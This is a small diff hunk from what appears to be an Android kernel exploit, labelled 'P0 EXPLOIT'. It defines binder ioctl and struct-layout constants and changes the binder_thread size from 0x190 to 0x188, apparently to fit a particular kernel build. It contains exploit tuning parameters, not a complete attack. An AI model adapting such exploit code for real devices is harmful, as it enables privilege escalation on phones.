@@ -32,7 +32,7 @@
 /// BEGIN P0 EXPLOIT ///
 #define BINDER_THREAD_EXIT 0x40046208ul
 // NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
-#define BINDER_THREAD_SZ 0x190
+#define BINDER_THREAD_SZ 0x188
 #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
 #define WAITQUEUE_OFFSET 0xA0
 #define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
